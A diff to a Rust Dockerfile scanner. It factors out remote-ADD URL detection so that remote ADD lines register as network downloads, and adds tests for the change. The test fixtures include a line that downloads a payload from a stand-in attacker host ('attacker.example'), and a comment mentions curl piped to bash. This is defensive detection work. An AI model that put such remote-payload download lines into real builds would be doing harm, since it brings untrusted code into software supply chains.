@@ -83,13 +83,7 @@ pub(crate) fn dockerfile_capabilities(content: &str) -> Vec<ArtifactCapabilityFa
         {
             has_network_download = true;
         }
-        // Dockerfile `ADD <url> <dest>` downloads from HTTP/HTTPS URLs at
-        // build time — functionally equivalent to `RUN curl … | bash` but
-        // invisible to the token-based network detection above.
-        if !has_network_download
-            && trimmed.starts_with("add ")
-            && (trimmed.contains("http://") || trimmed.contains("https://"))
-        {
+        if !has_network_download && is_remote_add_instruction(&trimmed) {
             has_network_download = true;
         }
     }
@@ -140,6 +134,7 @@ pub(crate) fn dockerfile_relations(content: &str) -> Vec<ArtifactLink> {
         if DOCKERFILE_NETWORK_DOWNLOAD_TOKENS
             .iter()
             .any(|t| token_with_boundary(&lower, t))
+            || is_remote_add_instruction(&lower)
         {
             links.push(ArtifactLink {
                 target: "remote-resource".to_string(),
@@ -148,6 +143,11 @@ pub(crate) fn dockerfile_relations(content: &str) -> Vec<ArtifactLink> {
         }
     }
     links
+}
+
+fn is_remote_add_instruction(lower_line: &str) -> bool {
+    lower_line.starts_with("add ")
+        && (lower_line.contains("http://") || lower_line.contains("https://"))
 }
 
 /// Check that `:latest` is a tag boundary, not a substring like
@@ -315,6 +315,22 @@ mod tests {
         }
     }
 
+    /// Contract: Dockerfile `ADD <url> <dest>` downloads remote content at
+    /// build time and must flip observed NetworkAccess.
+    #[test]
+    fn dockerfile_capabilities_detects_remote_add_url() {
+        let content = "FROM alpine\nADD https://attacker.example/payload /tmp/payload\n";
+        let caps = dockerfile_capabilities(content);
+        let has_observed_network = caps.iter().any(|fact| {
+            fact.capability == ArtifactCapability::NetworkAccess
+                && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
+        });
+        assert!(
+            has_observed_network,
+            "remote ADD URL must flip observed NetworkAccess; got {caps:?}",
+        );
+    }
+
     /// Contract: tokens like `nc` MUST require explicit whitespace boundaries
     /// — a substring match against `func`, `unc`, `vncserver`, etc., would
     /// over-fire. This pins the negative case to keep the boundary logic.
@@ -372,6 +388,35 @@ mod tests {
                 "token line `{token}` must produce a Downloads edge; got {links:?}",
             );
         }
+    }
+
+    /// Contract: `ADD <url> <dest>` must record the same Downloads edge as
+    /// explicit downloader commands.
+    #[test]
+    fn dockerfile_relations_records_download_edge_for_remote_add_url() {
+        let content = "FROM alpine\nADD https://attacker.example/payload /tmp/payload\n";
+        let links = dockerfile_relations(content);
+        assert!(
+            links
+                .iter()
+                .any(|l| matches!(l.relation, ArtifactRelation::Downloads)
+                    && l.target == "remote-resource"),
+            "remote ADD URL must produce a Downloads edge; got {links:?}",
+        );
+    }
+
+    /// Contract: only `ADD` has remote-fetch semantics; `COPY` with a URL-like
+    /// string must not produce a Downloads edge.
+    #[test]
+    fn dockerfile_relations_rejects_copy_url_lookalike() {
+        let content = "FROM alpine\nCOPY https://example.invalid/path /tmp/path\n";
+        let links = dockerfile_relations(content);
+        assert!(
+            !links
+                .iter()
+                .any(|l| matches!(l.relation, ArtifactRelation::Downloads)),
+            "COPY URL-like text must not produce a Downloads edge; got {links:?}",
+        );
     }
 
     /// Contract: regression guard for the original `curl`/`wget` coverage.
